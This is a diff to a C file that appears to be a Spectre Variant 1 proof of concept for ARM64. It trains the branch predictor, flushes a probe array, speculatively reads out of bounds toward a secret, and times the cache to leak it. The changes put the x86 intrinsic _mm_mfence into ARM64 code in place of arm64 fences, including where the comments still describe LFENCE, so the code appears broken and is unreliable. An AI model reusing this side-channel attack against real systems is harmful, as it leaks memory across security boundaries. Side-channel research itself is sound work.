@@ -1,4 +1,4 @@
-#include "../c_coded/utils_arm64.c"
+#include "../c_code/utils_arm64.c"
 
 // --- Spectre Variant 1 (Bounds Check Bypass) ---
 // ARM64-compatible version
@@ -38,11 +38,11 @@ int main_spectre_v1()
     {
         speculative_read_v1(i % g_vulnerable_array_size_v1);
     }
-    arm64_mfence(); // Ensure training writes are visible to memory system.
+    _mm_mfence(); // Ensure training writes are visible to memory system.
 
     // --- Attack Phase ---
     flush_probe_array(); // Clear probe array before attack
-    arm64_lfence();      // Architectural fence to prevent reordering beyond this point
+    _mm_mfence();      // Architectural fence to prevent reordering beyond this point
 
     // Calculate the "out-of-bounds" index to read 'secret_data_v1'.
     // This is highly simplified. In a real attack, this offset needs to be
@@ -62,7 +62,7 @@ int main_spectre_v1()
     // microarchitectural effect (cache line fill) remains. LFENCE ensures
     // that subsequent instructions (our timing measurements) don't start
     // before the speculative effects settle.
-    arm64_lfence();
+    _mm_mfence();
 
     // --- Measurement Phase ---
     perform_measurement(secret_data_v1, "Spectre V1 secret");
